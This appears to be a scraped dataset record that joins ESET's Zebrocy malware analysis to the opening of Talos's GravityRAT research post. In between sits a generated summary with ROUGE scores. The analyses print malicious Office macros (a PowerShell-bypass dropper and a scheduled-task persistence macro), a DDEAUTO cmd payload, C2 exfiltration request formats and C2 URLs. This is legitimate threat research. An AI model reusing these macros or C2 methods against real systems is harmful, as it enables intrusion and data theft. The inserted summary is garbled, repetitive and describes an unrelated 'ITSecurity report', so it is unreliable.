backdoor. Figure 1 shows the relationship between these components.In this article we describe this family and how it can coexist with the older Seduploader reconnaissance tools. We will talk about some similarities to and differences from Downdelph at the end.Figure 1 shows the attack methods and active malware used by Sednit. Email attachments are the main entry point to the Sednit ecosystem. DealersChoice is still being used, as research from Palo Alto Networks mentioned in this recent blogpost. Both Seduploader and Zebrocy are actively being delivered by the Sednit group through email attachments. Finally, after a reconnaissance phase, Xagent and Xtunnel are deployed on the targets deemed interesting by the operators.Attack methodsThe first component of a Zebrocy-based attack arrives as an email message. Victims are lured into opening email attachments that can be either Microsoft Office documents, or an archive.Malicious documentsMalicious documents used by Sednit download the first stage payload via Visual Basic for Applications (VBA), exploits or even using Dynamic Data Exchange (DDE).At the end of 2017, the Sednit group launched two campaigns delivering two different malicious documents. The first was named Syria - New Russia provocations.doc and the second named Note Letter Mary Christmas Card.doc.Both malicious documents contain a VBA macro that creates a randomly-named file in %TEMP%. The malware executable is then decoded and written into this file, which is then executed via a PowerShell command or via Scriptable Shell Objects.[...] Sub AutoClose() On Error Resume Next vAdd = """" For I = 1 To 8 vAdd = vAdd + Chr(97 + Rnd(20) * 25) Next vFileName = Environ(""temp"") & ""\"" + vAdd & "".e"" + ""x"" & ""e"" SaveNew vFileName, UserForm1.Label1.Caption Application.Run ""XYZ"", vFileName, ""WScript.Shell"" End Sub Public Function XYZ(vF, vW) vStr = ""powershell.exe -nop -Exec Bypass -Command Start-Process '"" + vF + ""',"" Call CreateObject(vW).Run(vStr, 0) End Function [...] TVpQAAIAAAAEAA8A//8AALgAAAAAAAAAQAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAEAALoQAA4ftAnNIbgBTM0hkJBUaGlzIHByb2dyYW0gbXVzdCBiZSBydW4gdW5kZXIgV2lu [...] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 [ . . . ] Sub AutoClose ( ) On Error Resume Next vAdd = """" For I = 1 To 8 vAdd = vAdd + Chr ( 97 + Rnd ( 20 ) * 25 ) Next vFileName = Environ ( ""temp"" ) & ""\"" + vAdd & "" . e "" + "" x "" & "" e "" SaveNew vFileName, UserForm1.Label1.Caption Application.Run "" XYZ "", vFileName, "" WScript . Shell "" End Sub Public Function XYZ(vF, vW) vStr = "" powershell . exe - nop - Exec Bypass - Command Start - Process '"" + vF + ""',"" Call CreateObject ( vW ) . Run ( vStr , 0 ) End Function [ . . . ] TVpQAAIAAAAEAA8A / / 8AALgAAAAAAAAAQAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAEAALoQAA4ftAnNIbgBTM0hkJBUaGlzIHByb2dyYW0gbXVzdCBiZSBydW4gdW5kZXIgV2lu [ . . . ]Example of Visual Basic function and base64 encoded first stage from Syria - New Russia provocations.doc document.ArchivesSome campaigns have used an archive to drop the first stage on the victim computer, rather than Office document macros. The archive is presumably delivered as an email attachment.All first stage of the Zebrocy family are executables with an icon and a document-like filename intended to trick the victim as shown in the Figure3.Delphi downloaderA Delphi downloader is the first stage of the Zebrocy family, although we have seen some campaigns from the Sednit group using the AutoIt stage directly without using this downloader. Most of these Delphi downloader binaries use Office document icons or other icons like Windows library, and sometimes these samples are packed with UPX. The purpose of this stage is quite straightforward: it retrieves a maximum of information from the victim's computer.When the malware is launched, a splash window pops up with a bogus error message and the filename of the dropped binary. For example, if the filename is srsiymyw.exe, the filename that appears in the splash window will be srsiymyw.doc (see Figure 4). The pop-up's purpose is to distract the user so that he won't think anything unusual is happening on his computer.In fact, the downloader is busy creating a file under %TEMP% with a filename hardcoded in the binary (although at this stage, the file is empty). Persistence is implemented by adding a Windows registry entry under HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ with the path of the hardcoded filename.To gather information, the malware creates a new process using the Windows API CreateProcess function with cmd.exe /c SYSTEMINFO & TASKLIST as lpCommandLine argument. Once the information is retrieved, it sends the result via a HTTP POST request to the C&C server hardcoded in the binary. It retries until it receives the next stage.Delphi downloader HTTP POST request POST (\/[a-zA-Z0-9\-\_\^\.]*){3}\.(php|dat)?fort=<SerialNumber_C> HTTP/1.0 Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: xxxx Host: <ip_address> Accept: text/html, */* Accept-Encoding: identity User-Agent: Mozilla v5.1 (Windows NT 6.1, rv:6.0.1) Gecko/20100101 Firefox/6.0.1 pol=MM/DD/YYYY%20HH:MM:SS%20(AM|PM)%0D%0A<DriveListing>%0D%0A%0D%0A<Path_to_the_binary>%0D%0A%0D%0A<SYSTEMINFO & TASKLIST output> [...] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 POST ( \ / [ a - zA - Z0 - 9 \ - \ _ \ ^ \ . ] * ) { 3 } \ . ( php | dat ) ? fort = < SerialNumber_C > HTTP / 1.0 Connection : keep - alive Content - Type : application / x - www - form - urlencoded Content - Length : xxxx Host : < ip_address > Accept : text / html , * / * Accept - Encoding : identity User - Agent : Mozilla v5 . 1 ( Windows NT 6.1 , rv : 6.0.1 ) Gecko / 20100101 Firefox / 6.0.1 pol = MM / DD / YYYY % 20HH : MM : SS % 20 ( AM | PM ) % 0D % 0A < DriveListing > % 0D % 0A % 0D % 0A < Path_to_the_binary > % 0D % 0A % 0D % 0A < SYSTEMINFO & TASKLIST output > [ . . . ]Delphi downloader HTTP POST requestOnce the request has been sent, the C&C server responds by sending the next stage, if the target is considered interesting by the operator. The time elapsing between the sending of the report and the receipt of the payload is a few hours. This next stage is written into the file created earlier and executed.AutoIt downloaderThe AutoIt downloader is another layer of the reconnaissance phase during an infection of the victim computer. From this point onwards, two scenarios are possible: in the first one, the Delphi downloader is the first stage and the second stage - which is the AutoIt downloader - is a lightweight downloader. In the other scenario, the AutoIt downloader is the first stage and it has all functionalities of the Delphi downloader and even more.When the AutoIt downloader is the first stage it performs many reconnaissance functions. Even if this one shares some similarities with the Delphi downloader, such as the persistence mechanism and the splash window, it adds more granularity to the reconnaissance phase than that of the Delphi downloader. Here is a non-exhaustive list of its capabilities:Detect sandbox and virtual environmentGet list of installed software (via HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall )) Get Windows version (32-bit or 64-bit)Get the process listGet hard drive informationGet screenshotGet various information about the victim computer using Windows Management Instrumentation (WMI) objects, probably inspired by code from this GitHub repositoryDepending on the previous stage, the name of the AutoIt binary is different. If the malware is dropped as the first stage, it has a document-like name. Otherwise it is given the name hardcoded in the Delphi downloader, as shown in Table 1.Table 1: AutoIt binary filenames, depending of the first stage First Stage AutoIt binary Filenames Delphi downloader csrsvc.exe Email attachment Protocol List_20160606.exeThe purpose of this stage is more of less the same as the previous one. There are many different versions in the wild but all of them include at least the code to achieve the following:Retrieve the serial number of the hard drive C:Use network functions from winhttp.dll or winhttp.au3or Execute the payload received from the C&C serverIn the same way that the Delphi downloader has a splash window, the AutoIt also has a splash window when it comes from an email attachment - the AutoIt is the first stage. The splash screen is related to the binary icon. For example, an AutoIt downloader with Adobe Reader as an icon displays a splash screen saying that the PDF file the victim would be expecting to be displayed is corrupted. An AutoIt binary with a Word icon will display the following popup asking for a password. The password is not considered here, we think it's just a way to distract the victim from the code's real malicious activity.Delphi backdoorThe Delphi backdoor is the final stage of the Zebrocy chain of components. We have seen Zebrocy downloading the Sednit group's flagship backdoor, Xagent, in the past.Unlike the previous components, this one has an internal version number that doesn't seem to be related to a specific campaign. This version number has evolved over time, as shown in Table 2:Table 2: Delphi backdoor internal version history PE timestamp version 2015-12-28 2.1 2016-01-06 2.2 2016-01-25 2.3 2016-02-03 2.4 2016-03-14 2.5 2016-04-08 3.0 2016-04-26 3.2 2016-06-01 4.4 2016-09-08 5.0 2016-12-15 5.1 2017-06-01 7.0 2017-09-26 8.0 2017-10-12 8.1 2017-11-12 8.2 2017-12-26 8.5 2018-01-09 8.6 2017-12-18 10.1 2018-01-09 10.2 2018-01-16 10.3 2018-01-18 11.0 2018-02-07 12.0 2018-03-05 13.0 2018-03-06 13.1 2018-03-14 14.0 2018-03-28 14.1Notice that we don't have the full visibility and we may have missed some versions of the backdoor. Besides, there is some overlap between versions meaning that some older versions are still used at the same time as newer versions.In the next few paragraphs we will highlight some differences seen in the malware during its evolution.The backdoor embeds a block of configuration. The configuration values change from one sample to another, but the list of configurable items stays the same. However, the way in which the configuration data are stored in the malware sample has evolved over time.The first versions of the backdoor embedded the configuration data in plaintext, as shown in Figure 6.Then, in later versions, the malware's authors encoded the configuration data as hexadecimal strings, as shown in Figure 7.In the latest versions, the configuration data is encrypted in the resources using the AES algorithm. Older versions stored it in the .text section.The configuration data contains:AES keys to communicate with the C&C serverURLs with paths differing from one sample to anotherThe version of the malwareThe windows registry key/value that ensures the persistence of the backdoorPath where temporary files are store ( %APPDATA% )) The names of hidden directories to be created to store temporary files: the directory filenames are concatenated with the environment variable ( %APPDATA% )Once the malware is set up, it executes callback functions via the Windows API function SetTimer. These callbacks allow the operator to handle many features and commands of the backdoor.Take a screenshot of the Desktop of the victimCapture keystrokesList drives/network resourcesRead/write into Windows registryCopy/move/delete a file system objectExecute files or create scheduled tasksThe number of commands handled by the backdoor - about 30 - differs from one version to another.To communicate with the C&C server, the backdoor stores the report of these functions into a temporary file. Then it will read the content of the temporary file and send it on. These temporary files are stored in one of the hidden directories created during the set-up phase.POST (\/[a-zA-Z0-9\-\_\^\.]*){3}\.(php|dat). HTTP/1.0 Connection: keep-alive Content-Type: multipart/form-data, boundary=--------<mmddyyhhnnsszzz> Content-Length: <N> Host: <ip_address> Accept: text/html, */* Accept-Encoding: identity User-Agent: Mozilla/3.0 (compatible, Indy Library) ----------<mmddyyhhnnsszzz> Content-Disposition: form-data, name=""userfile"", filename=""%APPDATA%\Microsoft\<directories>\<tempfilename>.tmp"" Content-Type: <tempfilename_hex_encoded>.tmp <tempfilename content> ----------<mmddyyhhnnsszzz>-- 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 POST ( \ / [ a - zA - Z0 - 9 \ - \ _ \ ^ \ . ] * ) { 3 } \ . ( php | dat ) . HTTP / 1.0 Connection : keep - alive Content - Type : multipart / form - data , boundary = -- -- -- -- < mmddyyhhnnsszzz > Content - Length : < N > Host : < ip_address > Accept : text / html , * / * Accept - Encoding : identity User - Agent : Mozilla / 3.0 ( compatible , Indy Library ) -- -- -- -- -- < mmddyyhhnnsszzz > Content - Disposition : form - data , name = ""userfile"" , filename = ""%APPDATA%\Microsoft\<directories>\<tempfilename>.tmp"" Content - Type : < tempfilename_hex_encoded > . tmp < tempfilename content > -- -- -- -- -- < mmddyyhhnnsszzz > --Delphi backdoor POST requestThe tempfilename content is the output of whichever commands are executed. The content is encrypted using the AES-256-ECB algorithm with the first AES key from the configuration data, then the output is hexadecimal encoded. The contents sent to the C&C server vary from one command to another, but all contains at least the HDD serial number and the first four bytes of the computer name.For example, HELLO corresponds to the first packet sent by the backdoor to establish contact with the C&C server. As shown below it contains the date when the task was launched, the Delphi backdoor's internal version number, the HDD serial number, the computer name (first four bytes), the command and the date when the backdoor was executed.Start: 1/4/2018 1:37:00 PM - [<vx.x>]:42424242ESET-HELLO-[2018-04-04 01-37-00]-315.TXT.The second AES key in the configuration data is used to decrypt the answer from the C&C server.Like Seduploader, this backdoor is used to deploy Xagent on victim machines apparently deemed ""interesting"" by the operators after the reconnaissance phase.SummaryA component written in Delphi is nothing new for the Sednit group, which has already used this language for Downdelph. However, even if this latest component has nothing else in common with Downdelph ""technically speaking"", there are some points of interest worth mentioning.The deployment methods are the same, both being delivered as an email attachment.We saw Downdelph for the last time in September 2015, and the first sample of Zebrocy we saw in the wild was dated November 2015.Both are written in Delphi.We can hypothesize that the Sednit group abandoned one component and started to develop a new one. One thing that doesn't change for the group, however, are the mistakes they made:The name of the scheduled task: WindiwsThe function name that retrieves system information in the AutoIt downloader is _SOFWARE()Mary instead of Merry in Note Letter Mary Christmas Card.docThe byte arrays used by the Delphi backdoor as AES-256 keys are 38 bytes long instead of 32 bytes. It's not a spelling error but probably due to a lack of attention.We have seen Zebrocy being heavily used by the Sednit group over the last two years. Our analysis of the many new variants that appeared on a regular basis since 2017 clearly indicates that Zebrocy is being actively maintained and improved by its author(s). We can consider it as one of the stable, mature tools in Sednit's arsenal, a tool that deserves to be monitored closely.IoCsMalicious documentsSHA-1 ESET Detection name Filename 4f07d18475601d0492cbf678ee0f0860c729910e VBA/TrojanDropper.Agent.YC Note Letter Mary Christmas Card.doc f10b2c052afc07e2dec9dbe816031059fdc900ba VBA/TrojanDropper.Agent.AAK Syria - New Russia provocations.docDelphi downloaderSHA-1 ESET Detection name 00b39f2deaf1f1fc29e5acb63f4d1100e04fd701 Win32/TrojanDownloader.Delf.CFS 07e44b44c5f1043d16f6011a2cf0d2e7c5a52787 Win32/TrojanDownloader.Delf.CFG 0f946f619ae8e2181a5bd76c8af03347742765c6 Win32/TrojanDownloader.Delf.CGW 2900ed173a9f5dc99f905942a6be595cc6f03387 Win32/TrojanDownloader.Delf.CFG 2b5a7f4e054d0130883c8821b629121e0228bf54 Win32/TrojanDownloader.Delf.CIP 36b5e59a01e7f244d4a3bbb539e57aa468115dc8 Win32/TrojanDownloader.Delf.CGB 37bd951c483da057337ef8f38d6e48051cbb39d0 Win32/TrojanDownloader.Delf.CHC 41686703ce9e9aec64b6ad1c516746751219bc62 Win32/TrojanDownloader.Delf.CFS 4e6470f4a245efaa138c8c6eedb046e916706383 Win32/TrojanDownloader.Delf.CGW 54b14fc84f152b43c63babc46f2597b053e94627 Win32/TrojanDownloader.Delf.CGB afd5a60b7fff4deea15f7011339ad2cc2987a937 Win32/TrojanDownloader.Delf.CGW d4ab51bc5c26183771e3358d76e348943f9dd2fc Win32/TrojanDownloader.Delf.CGB d6fdc72792ee736b8d606d40d72cb89d6e8a3e18 Win32/TrojanDownloader.Delf.CFUAutoIt downloaderSHA-1 ESET Detection name 0cd61d367dd0b13000774ab77abf3d4cfb713c8e Win32/TrojanDownloader.Autoit.ODO 185ab7a371b58ff367c155ec0dabe28842d340bd Win32/TrojanDownloader.Autoit.OBG 267abd7105ac26d5cb6ecb96292f83708f64b994 Win32/TrojanDownloader.Autoit.OHC 4a6dcbccab5344388b331d543cc2260ca531c7ca Win32/Autoit.CT 62dcf2f33ecc6014fa9a10f4e9ac9fd9bb0a6d23 Win32/TrojanDownloader.Autoit.OCO b8b847d3d0139db68dba730b3424b29dcb40b3c7 Win32/TrojanDownloader.Autoit.OMA c0271dbb02636402742c390ffbeee6418f696668 Win32/TrojanDownloader.Autoit.OMB d379b94a3eb4fd9c9a973f64d436d7fc2e9d6762 Win32/Spy.Autoit.EI dabeadf0a9af3a8a0802f8445670806cd7671b1d Win32/TrojanDownloader.Autoit.OCIDelphi backdoorSHA-1 ESET Detection name 0983d940ba42135106bf7a1e87ed5a1975fc7ead Win32/Delf.BFF 226083c7190f1a939d5b7b352400450690d59f65 Win32/Delf.BDW 245868d6805c66181808973e93f23293d6d2f7d1 Win32/Delf.BDT 2c01ae417e5de213845b1ed46d4e82d45edd598d Win32/Delf.BBP 4ccbe222bd97dc229b36efaf52520939da9d51c8 Win32/Delf.BFC 51ae516792570bcd069a657c27859cd3fdc07d00 Win32/Delf.BBP 55179f0c6bce5a37311a44efe3f9845096c09668 Win32/Delf.AWE 6fd7ce97061169b835ea77976651b5bf20aca4ef Win32/TrojanDownloader.Delf.BRV 7349843e4dac1226ad6ce3e3cda8c389dd599548 Win32/TrojanDownloader.Delf.BRV 7b5c223a4968cc2190c1b5444cad47187d27ec50 Win32/TrojanDownloader.Delf.BRV 83882e13b369986b513f4aae245c112b82ec2097 Win32/Delf.BEB 8aedf7a462024acf72d708c89230e4f02d94bc78 Win32/Delf.BDT 8bd56b580974ae195e9f92b3aa525547d33434c1 Win32/Delf.BEC 9beacd8e145fa01e16409d44d8b9470af6c7afd8 Win32/Delf.BBP a172fe6e91170f858c8ce5d734c094996bdf83d0 Win32/Delf.BDT ae93b6ec2d56512a1c7e8c053d2a6ce6fdfb7e4c Win32/Delf.BEX c08d89c7f7be69d5d705d4ac7e24e8f48e22faaf Win32/Delf.BDW c2f3ca699aef3d226a800c2262efdca1470e00dc Win32/Delf.AVP cdf9c24b86bc9a872035dcf3f53f380c904ed98b Win32/Delf.BEH f63e29621c8becac47ae6eac7bf9577bd0a37b73 Win32/Delf.AVT fea8752d90d2b4f0fc49ac0d58d62090782d8c5b Win32/Delf.BFNURLshttp://142[.]0.68.2/test-update-16-8852418/temp727612430/checkUpdate89732468.phphttp://142[.]0.68.2/test-update-17-8752417/temp827612480/checkUpdate79832467.phphttp://185[.]25.50.93/syshelp/kd8812u/protocol.phphttp://185[.]25.50.93/tech99-04/litelib1/setwsdv4.phphttp://185[.]25.50.93/techicalBS391-two/supptech18i/suppid.phphttp://185[.]25.51.114/get-help-software/get-app-c/error-code-lookup.phphttp://185[.]25.51.164/srv_upd_dest_two/destBB/en.phphttp://185[.]25.51.198/get-data/searchId/get.phphttp://185[.]25.51.198/stream-upd-service-two/definition/event.phphttp://185[.]77.129.152/wWpYdSMRulkdp/arpz/MsKZrpUfe.phphttp://188[.]241.68.121/update/dB-Release/NewBaseCheck.phphttp://194[.]187.249.126/database-update-centre/check-system-version/id=18862.phphttp://194[.]187.249.126/security-services-DMHA-group/info-update-version/id77820082.phphttp://213[.]103.67.193/ghflYvz/vmwWIdx/realui.phphttp://213[.]252.244.219/client-update-info/version-id/version333.phphttp://213[.]252.244.219/cumulative-security-update/Summary/details.phphttp://213[.]252.245.132/search-release/Search-Version/crmclients.phphttp://213[.]252.245.132/setting-the-os-release/Support-OS-release/ApiMap.phphttp://220[.]158.216.127/search-sys-update-release/base-sync/db7749sc.phphttp://222[.]15.23.121/gft_piyes/ndhfkuryhs09/fdfd_iunb_hhert_ps.phphttp://46[.]102.152.127/messageID/get-data/SecurityID.phphttp://46[.]183.223.227/services-check-update/security-certificate-11-554/CheckNow864.phphttp://80[.]255.6.5/daily-update-certifaicates52735462534234/update-15.dathttp://80[.]255.6.5/LoG-statistic8397420934809/date-update9048353094c/StaticIpUpdateLog23741033.phphttp://86[.]105.18.106/apps.update/DetailsID/clientPID-118253.phphttp://86[.]105.18.106/data-extract/timermodule/update-client.phphttp://86[.]105.18.106/debug-info/pluginId/CLISD1934.phphttp://86[.]105.18.106/ram-data/managerId/REM1234.phphttp://86[.]105.18.106/versionID/Plugin0899/debug-release01119/debug-19.apphttp://86[.]105.18.111/UpdateCertificate33-33725cnm^BB/CheckerNow-saMbA-99-36^11/CheckerSerface^8830-11.phphttp://86[.]106.131.177/srvSettings/conf4421i/support.phphttp://86[.]106.131.177/SupportA91i/syshelpA774i/viewsupp.phphttp://89[.]249.65.166/clientid-and-uniqued-r2/the-differenceU/Events76.phphttp://89[.]249.65.166/int-release/check-user/userid.phphttp://89[.]249.65.234/guard-service/Servers-ip4/upd-release/mdb4http://89[.]40.181.126/verification-online/service.911-19/check-verification-88291.phphttp://89[.]45.67.153/grenadLibS44-two/fIndToClose12t3/sol41.phphttp://89[.]45.67.153/supportfsys/t863321i/func112SerErr.phphttp://93[.]113.131.117/KB7735-9927/security-serv/opt.phphttp://93[.]113.131.155/Verifica-El-Lanzamiento/Ayuda-Del-Sistema/obtenerId.phphttp://93[.]115.38.132/wWpYdSMRulkdp/arpz/MsKZrpUfe.phphttp://rammatica[.]com/QqrAzMjp/CmKjzk/EspTkzmH.phphttp://rammatica[.]com/QqrAzMjp/CmKjzk/OspRkzmG.phpSign up to receive an email update whenever a new article is published in our Ukraine Crisis - Digital Security Resource Center Submit";Zebrocy is a family of malware, comprising downloaders and backdoors written in Delphi and AutoIt. These components play the same role in the Sednit ecosystem as Seduploader that of firststage malware. Victims we have seen targeted by Zebrocy are located in Azerbaijan, Bosnia and Herzegovina, Egypt, Georgia, Iran, Kazakhstan, Korea, Kyrgyzstan, Russia, Saudi Arabia, Serbia, Switzerland, Tajikistan, Turkey, Turkmenistan, Ukraine, Uruguay and Zimbabwe. These targets include embassies, ministries of foreign affairs, and diplomats. The Zebrocy family consists of three components. In the order of deployment these are a Delphi downloader, an AutoIt downloader and a Delphi backdoor. Figure 1 shows the relationship between these components. In this article we describe this family and how it can coexist with the older Seduploader reconnaissance tools. We will talk about some similarities to and differences from Downdelph at the end. Figure 1 shows the attack methods and active malware used by Sednit. Email attachments are the main entry point to the Sednit ecosystem. DealersChoice is still being used, as research from Palo Alto Networks mentioned in this recent blogpost. Both Seduploader and Zebrocy are actively being delivered by the Sednit group through email attachments. Finally, after a reconnaissance phase, Xagent and Xtunnel are deployed on the targets deemed interesting by the operators. Attack methods The first component of a Zebrocybased attack arrives as an email message. Victims are lured into opening email attachments that can be either Microsoft Office documents, or an archive. Malicious documents Malicious documents used by Sednit download the first The summary of the ITSecurity report is as follows: The ITSecurity report provides an overview of the current state of cybersecurity. It discusses the latest trends in cybersecurity, such as the increased use of artificial intelligence and machine learning in cybersecurity, as well as the emergence of new threats such as ransomware and cryptojacking. The report also provides an overview of the current state of cybersecurity regulations, such as the European Union’s General Data Protection Regulation (GDPR) and the United States’ National Institute of Standards and Technology (NIST) Special Publication 800171. The report also provides an overview of the current state of cybersecurity threats, such as the increased use of artificial intelligence and machine learning in cybersecurity, as well as the emergence of new threats such as ransomware and cryptojacking. The report also provides an overview of the current state of cybersecurity regulations, such as the European Union’s General Data Protection Regulation (GDPR) and the United States’ National Institute of Standards and Technology (NIST) Special Publication 800171. The report also provides an overview of the current state of cybersecurity threats, such as the increased use of artificial intelligence and machine learning in cybersecurity, as well as the emergence of new threats such as ransomware and cryptojacking. The report also provides an overview of the current state of cybersecurity regulations, such as the European Union’s General Data Protection Regulation (GDPR) and the United States’ National Institute of Standards and Technology (NIST) Special Publication 800171. <Delphi downloader payload> The Delphi backdoor is the final stage of the Zebrocy chain of components. It is a backdoor that allows the attacker to remotely control the victim's computer. The backdoor is written in Delphi, a popular programming language for Windows. The attacker can use the Delphi backdoor to execute malicious code on the victim's computer. The attacker can also use the Delphi backdoor to steal sensitive data from the victim's computer. The attacker can also use the Delphi backdoor to install additional malware on the victim's computer. The ITSecurity report has been successfully summarized.;en;{'r': 0.14752724224643754, 'p': 0.7586206896551724, 'f': 0.24701754113363128};{'r': 0.10347682119205298, 'p': 0.6631299734748011, 'f': 0.17901897367624475};{'r': 0.14752724224643754, 'p': 0.7586206896551724, 'f': 0.24701754113363128}
https://blog.talosintelligence.com/gravityrat-two-year-evolution-of-apt/;GravityRAT - The Two-Year Evolution Of An APT Targeting India;"This blog post is authored by Warren Mercer and Paul Rascagneres.Update: 4/30 Since the publication of the blog post, one of the anti-VM capability was commented a lot on Twitter: the detection of Virtual Machines by checking the temperature of the system. We decided to add more details and clarifications concerning this feature. GravityRAT uses a WMI request in order to get the current temperature of the hardware. Here is the output of the query on a physical machine (a Surface Book):The query returns the temperature of 7 thermal zones.Here is the output on a Virtual Machine executed by Hyper-V on the same hardware:The feature is not supported. The malware author used this behavior in order to identify VM (such as Sandboxes).From our tests and the feedback from several researchers, this monitoring is not supported on Hyper-V, VMWare Fusion, VirtualBox, KVM and XEN. It's important to notice that several recent physical systems do not support it (a researcher reported some Lenovo and Dell hosts did not support this). It means that GravityRAT will consider this physical machine as VMs. Importantly to note this check is not foolproof as we have identified physical hosts which do not report back the temperature, however, it should also be considered a check that is identifying a lot of virtual environments. This is particularly important due to the amount of sandboxing & malware detonation being carried out within virtual environments by researchers.SummaryToday, Cisco Talos is uncovering a new piece of malware, which has remained under the radar for the past two years while it continues to be developed. Several weeks ago, we identified the use of the latest version of this RAT (Remote Access Tool). In this article, we will discuss the technical capabilities, the evolution, development and potential attribution of what we are calling GravityRAT.GravityRAT has been under ongoing development for at least 18 months, during which the developer has implemented new features. We've seen file exfiltration, remote command execution capability and anti-vm techniques added throughout the life of GravityRAT. This consistent evolution beyond standard remote code execution is concerning because it shows determination and innovation by the actor.Throughout our investigation, we observed several malicious documents used to attack victims, which we will discuss. These malicious documents were used by the developer to run several tests on the popular analysis platform VirusTotal. Using VirusTotal allowed the developer to make changes in an attempt to decrease antivirus detection.Although GravityRAT has not been previously published or discussed, there was some information from the National Computer Emergency Response Team (CERT) of India describing GravityRAT as being used in targeted attacks against India. Finally, we will discuss specific attribution elements discovered during our research into GravityRAT as we identify specific information, which we believe to be leaked by the developer, such as location, and potentially their first name.Infection VectorsMalicious Office DocumentsThe majority of the malicious documents crafted by the malware author are Microsoft Office Word documents. The attacker uses an embedded macro in order to execute malicious code on the victim's system. The document opens and appears as such:The document asks to the user to enable macros in order to prove that the user is not a robot (similar to the CAPTCHA we often see on the internet). This, however, is a known tactic that a lot of Office-based malware uses. It is an attempt to trick any users who are using Protected Mode on their systems. By enabling macros, the malware is able to begin it's execution. We discovered that the embedded macro is quite small when extracted.Sub AutoOpen() If Not Dir(Environ(""TEMP"") + ""\image4.exe"") <> """" Then Const lCancelled_c As Long = 0 Dim sSaveAsPath As String sSaveAsPath = CreateObject(""WScript.Shell"").ExpandEnvironmentStrings(""%Temp%"") + ""\temporary.zip"" If VBA.LenB(sSaveAsPath) = lCancelled_c Then Exit Sub ActiveDocument.Save Application.Documents.Add ActiveDocument.FullName ActiveDocument.SaveAs sSaveAsPath ActiveDocument.Close Set app = CreateObject(""Shell.Application"") ExtractTo = CreateObject(""WScript.Shell"").ExpandEnvironmentStrings(""%Temp%"") ExtractByExtension app.NameSpace(Environ(""TEMP"") + ""\temporary.zip""), ""exe"", ExtractTo End If End Sub Sub ExtractByExtension(fldr, ext, dst) Set FSO = CreateObject(""Scripting.FileSystemObject"") Set app = CreateObject(""Shell.Application"") For Each f In fldr.Items If f.Type = ""File folder"" Then ExtractByExtension f.GetFolder, ext, dst ElseIf LCase(FSO.GetExtensionName(f.Name)) = LCase(ext) Then If Not Dir(Environ(""TEMP"") + ""\image4.exe"") <> """" Then app.NameSpace(dst).CopyHere f.Path, &H4 End If End If Next Shell ""schtasks /create /tn wordtest /tr """"'%temp%\image4.exe' 35"""" /sc DAILY /f /RI 10 /du 24:00 /st 00:01"" End SubThis macro contains three functions:The first one is executed when the document is opened. The purpose is to copy the active document (the opened Word document) in a temporary directory and to rename it as a ZIP archive. Indeed, the docx format is, in fact, a common ZIP archive, and can be unzipped using common tools.The second function decompresses this 'temporary.zip' file and extracts the .exe file stored in it.The third creates a scheduled task, named 'wordtest', to execute this malicious file every day. With this approach, the attacker ensures that there is no direct execution (the executable is executed thanks to scheduled tasks), there's no download of an additional payload, and finally, the author uses the fact that the docx format is an archive in order to include its executable (GravityRAT).Testing By The AuthorDuring our tracking, we identified several malicious documents submitted from this actor on VirusTotal for testing purposes. They tested the detection on macros (by modifying them, or by executing the calc instead of the malicious payload) and the developers tried dynamic data exchange (DDE) execution in the Office document. This is abusing the DDE protocol which exists within Microsoft Office documents. Whilst this is a feature Microsoft provide it is also a feature that an attacker can leverage for malicious activity, Microsoft published mitigation information here previously. The developer crafted Office Word and Excel documents to see the detection in VirusTotal. The authors tried to hide the DDE object in a different part of the document -- in the main object and the header, for example. The DDE object simply executes Microsoft calc in the detected sample. Here is an example:<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?> <w:document [...redated...}] mc:Ignorable=""w14 w15 wp14""><w:body><w:p w:rsidR=""00215C91"" w:rsidRDefault=""008C166A""><w:r><w:fldChar w:fldCharType=""begin""/></w:r><w:r><w:instrText xml:space=""preserve""> </w:instrText></w:r><w:r><w:rPr><w:rFonts w:ascii=""Helvetica"" w:hAnsi=""Helvetica"" w:cs=""Helvetica""/><w:color w:val=""383838""/><w:spacing w:val=""3""/><w:sz w:val=""26""/><w:szCs w:val=""26""/><w:shd w:val=""clear"" w:color=""auto"" w:fill=""FFFFFF""/></w:rPr><w:instrText>DDEAUTO c:\\windows\\system32\\cmd.exe ""/k calc.exe""</w:instrText></w:r><w:r><w:instrText xml:space=""preserve""> </w:instrText></w:r><w:r><w:fldChar w:fldCharType=""end""/></w:r><w:bookmarkStart w:id=""0"" w:name=""_GoBack""/><w:bookmarkEnd w:id=""0""/></w:p><w:sectPr w:rsidR=""00215C91""><w:pgSz w:w=""12240"" w:h=""15840""/><w:pgMar w:top=""1440"" w:right=""1440"" w:bottom=""1440"" w:left=""1440"" w:header=""720"" w:footer=""720"" w:gutter=""0""/><w:cols w:space=""720""/><w:docGrid w:linePitch=""360""/></w:sectPr></w:body></w:document>We believe the filenames of the submitted samples are clearly testing docs, using different methods and Office tricks to attempt to ensure his malware was undetected. Those names were:testnew1.docxTest123.docxtest456.docxtest2.docxbook1test2.xlsxTest123.docGravityRATOur initial discovery of GravityRAT was through a malicious Word document. As explained previously, this Word document had various macros to deliver a final payload.Considering that this was the most recent version of the malware, we decided to ascertain how long this actor had been active, and how their attacks had evolved. We were able to discover four distinct versions of GravityRAT, developed over two years. Next, we will go through what we believe is the development life cycle and feature-addition mission carried out by this developer.Version G1The malware author uses a versioning system starting by the G letter. The oldest version we identified is G1. Here is the PDB path of the sample:f:\F\Windows Work\G1\Adeel's Laptop\G1 Main Virus\systemInterrupts\gravity\obj\x86\Debug\systemInterrupts.pdbYou can notice the potential first name of the developers: Adeel. Of course, this information can be manipulated by the malware author. This sample was compiled in December 2016. The original filename of the sample was resume.exe.The purpose of this version was to steal information on the compromised system:MAC AddressComputer nameUsernameIP addressDateSteal files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf and .pdfThe volumes mapped on the systemAll this information was then sent to one of the following domains:G1 also had the ability to execute commands remotely on the infected host machine at the author's will.Version G2We identified a new variant used in July 2017 named G2. Here is the PDB of the sample:e:\Windows Work\G2\G2 Main Virus\Microsoft Virus Solutions 